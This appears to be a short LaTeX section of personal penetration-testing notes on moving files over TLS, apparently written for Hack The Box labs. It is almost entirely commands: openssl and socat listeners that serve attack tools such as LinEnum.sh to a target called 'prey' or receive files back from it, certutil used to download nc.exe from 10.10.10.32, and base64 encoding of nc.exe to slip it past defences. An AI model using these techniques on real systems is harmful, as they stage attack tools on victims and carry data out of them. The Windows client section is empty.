\section{over TLS}

\subsection{Linux Server}
\subsubsection{Openssl}
\begin{verbatim}
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 \
    -out certificate.pem

openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem  \
    < /tmp/LinEnum.sh
\end{verbatim}

\subsubsection{SoCat}
\begin{verbatim}
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 \
    -out cert.pem
cat key.pem cert.pem > sslkey.pem

# send to prey
socat -d [-d] OPENSSL-LISTEN:<port>,cert=sslkey.pem,verify=0,fork \
    file:./served_file
# recv to prey 
socat -d [-d] OPENSSL-LISTEN:<port>,cert=sslkey.pem,verify=0,fork \ 
    STDOUT > /path/to/downloaded/file
\end{verbatim}



\subsection{Windows Servers}
\begin{verbatim}
PS C:\> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
PS C:\> certutil.exe -encode nc.exe nc.txt
PS C:\> certutil.exe -decode nc.txt nc.exe
# Si openssl
PS C:\htb> openssl.exe enc -base64 -in nc.exe -out nc.txt
PS C:\htb> openssl.exe enc -base64 -d -in nc.txt -out nc.exe
\end{verbatim}

\subsection{Linux client}
\begin{verbatim}
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
\end{verbatim}

\subsection{Windows client}
\begin{verbatim}
\end{verbatim}
